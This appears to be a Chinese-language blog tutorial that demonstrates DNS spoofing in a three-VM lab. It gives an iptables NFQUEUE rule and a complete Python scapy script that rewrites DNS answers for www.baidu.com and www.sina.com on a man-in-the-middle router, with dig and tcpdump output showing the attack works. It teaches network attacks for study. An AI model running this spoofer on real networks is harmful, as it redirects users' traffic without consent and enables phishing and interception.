---
layout:     post
title:      "DNS污染的Python实现"
subtitle:   "Modify packets with nfqueue and scapy"
date:       2019-05-25 00:00:00
author:     "NJL"
header-img: "img/post-bg-2015.jpg"
tags:
    - Python
    - iptables
    - DNS 
---


#### 0x01 引言

本文简单介绍了一种 Man-in-the-middle 的 DNS 攻击方法。在中间设备上通过 iptables 捕获 DNS Packet，然后使用 Scapy 来修改 DNS 的 Resource Record， 以此来实现 DNS 污染。


#### 0x02 测试环境拓扑 

准备三台虚机，分别是以下 IP

    Node1: 192.168.129.107  # client
    Node2：192.168.129.112  # router
    Node3：192.168.129.113  # dns server 

![Deployment Image](/img/in-post/post-dns-spoof/DNS_SPOOF.jpg)
 
Node2 作为中间路由器, 需要打开 `ipv4_forward`, 并在 Node1 和 Node3上 分别设置明细路由，使Node2作为它们的网关  


    # 在 node2 上执行，开启转发
    root@node2:/# sysctl -p
    net.ipv4.ip_forward = 1

    # 在 node1 上执行, 目的地址为 Node3 的数据包下一跳为 Node2
    root@node1:/# ip route add 192.168.129.113 via 192.168.129.112

    # 在 node3 上执行, 目标地址为 Node1 的数据包下一跳为 Node2 
    root@node3:/# ip route add 192.168.129.107 via 192.168.129.112

    #在 node3 上安装 dnsmasq 
    root@node3:/# apt-get install dnsmasq

测试域名解析，node1 向 node3 请求 www.baidu.com 的域名解析，  node2 上应该能能抓到DNS请求和应答包

    # 在node1 上向 node3 请求 dns 解析
     root@node1:/#dig www.baidu.com @192.168.129.113

    # 在 node2 上应该能抓到 DNS 解析包
    root@node2:/# tcpdump -i any -p udp and host 192.168.129.107 and port 53
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
    08:44:29.634961 IP 192.168.129.107.37559 > 192.168.129.113.domain: 63650+ [1au] A? www.baidu.com. (54)
    08:44:29.635083 IP 192.168.129.107.37559 > 192.168.129.113.domain: 63650+ [1au] A? www.baidu.com. (54)
    08:44:29.642843 IP 192.168.129.113.domain > 192.168.129.107.37559: 63650 3/0/1 CNAME www.a.shifen.com., A 115.239.211.112, A 115.239.210.27 (101)
    08:44:29.642918 IP 192.168.129.113.domain > 192.168.129.107.37559: 63650 3/0/1 CNAME www.a.shifen.com., A 115.239.211.112, A 115.239.210.27 (101)


#### 0x03 修改 DNS 应答报文 

node2 上添加一条iptables 规则， 使所有 DNS Response Packet 都进入 `nfqueue 0` 中 

    
    root@node2:/# iptables -t filter -I FORWARD 1 -p udp --sport 53 -j NFQUEUE --queue-num 0


安装`netfilterQueue`的底层依赖 `libnfnetlink`, 从 https://netfilter.org/projects/ 下载。

#### [libnfnetlink](https://netfilter.org/projects/libnfnetlink/index.html)

> `libnfnetlink` is the low-level library for netfilter related kernel/userspace communication. It provides a generic messaging infrastructure for in-kernel netfilter subsystems(nfnetlink_log, nfnetlink_queue, nfnetlink_conntrack).  
This library is not meant as a public API for application developers. It's only used by other netfilter.org projects.  

简而言之就是为其他netfilter项目提供底层的消息基础设施  

#### [libnetfilter_queue](https://netfilter.org/projects/libnetfilter_queue/)

> It is a userspace library providing an API to packets that have queued by the kernel packet filter. 

提供从 kernel nfnetlink_queue 中获取 packet 的接口， 并可以修改包并重新入队  

---

以下为 dns_ans_spoof 的源码


    root@node2:/# cat dns_ans_spoof.py 

    import scapy.all as scapy
    from netfilterqueue import NetfilterQueue
    
    # 只修改此 DNS Server的响应
    target_dns_servers = ['192.168.129.113']
    # 将 www.baidu.com 的域名解析修改为 1.1.1.1
    target_domains = {
       'www.baidu.com.': '1.1.1.1',
       'www.sina.com.': '2.2.2.2'
    }
    target_domains_set = target_domains.keys()
    
    def dns_spoof_and_accept(pkt):
        try:
            dns_packet = scapy.IP(pkt.get_payload())
            dns_server_ip = dns_packet[scapy.IP].src
            # 源地址匹配，并且有 RR 记录
            if dns_server_ip in target_dns_servers and dns_packet.haslayer(scapy.DNSRR):
                qname = dns_packet[scapy.DNSQR].qname 
                if qname in target_domains_set:
                    dns_response = scapy.DNSRR(rrname=qname, rdata=target_domains[qname])
                    dns_packet[scapy.DNS].an = dns_response
                    dns_packet[scapy.DNS].ancount = 1
                    # 删除Checksum 
                    del dns_packet[scapy.IP].len
                    del dns_packet[scapy.IP].chksum
                    del dns_packet[scapy.UDP].len
                    del dns_packet[scapy.UDP].chksum
                    pkt.set_payload(str(dns_packet))
        except Exception as e:
            pass
        finally:
            pkt.accept()
    
    nfqueue = NetfilterQueue()
    # 满足条件的 pkt 会进入此 nfqueue, 交给 dns_spoof_and_accept(pkt) 来处理
    nfqueue.bind(0, dns_spoof_and_accept)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print('Exit')
    
    nfqueue.unbind()






运行 `dns_ans_spoof.py`, 然后再次在 node1 上请求 dns 解析


    # 百度的地址已经被修改为了 1.1.1.1, 其他未配置的请求不会被修改
    root@node1:/# dig www.baidu.com @192.168.129.113 

    ; <<>> DiG 9.11.3-1ubuntu1.5-Ubuntu <<>> www.baidu.com @192.168.129.113
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23488
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
    
    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 4096
    ;; QUESTION SECTION:
    ;www.baidu.com.			IN	A
    
    ;; ANSWER SECTION:
    www.baidu.com.		0	IN	A	1.1.1.1
    
    ;; Query time: 83 msec
    ;; SERVER: 192.168.129.113#53(192.168.129.113)
    ;; WHEN: Mon Mar 11 17:07:56 CST 2019
    ;; MSG SIZE  rcvd: 71


    # 查看 node2 上的抓包信息 
    09:07:56.433256 IP 192.168.129.107.38241 > 192.168.129.113.domain: 23488+ [1au] A? www.baidu.com. (54)
    09:07:56.433479 IP 192.168.129.107.38241 > 192.168.129.113.domain: 23488+ [1au] A? www.baidu.com. (54)
    # Original DNS Resp
    09:07:56.442586 IP 192.168.129.113.domain > 192.168.129.107.38241: 23488 3/0/1 CNAME www.a.shifen.com., A 115.239.211.112, A 115.239.210.27 (101)
    # Modified DNS Resp
    09:07:56.515473 IP 192.168.129.113.domain > 192.168.129.107.38241: 23488 1/0/1 A 1.1.1.1 (71)


#### 0x04 Reference


https://medium.com/@777rip777/dns-spoofer-with-scapy-part-5-4a84b17f35a3  
https://scapy.readthedocs.io/en/latest/introduction.html  
https://en.wikipedia.org/wiki/Domain_Name_System  
https://en.wikipedia.org/wiki/DNS_spoofing  

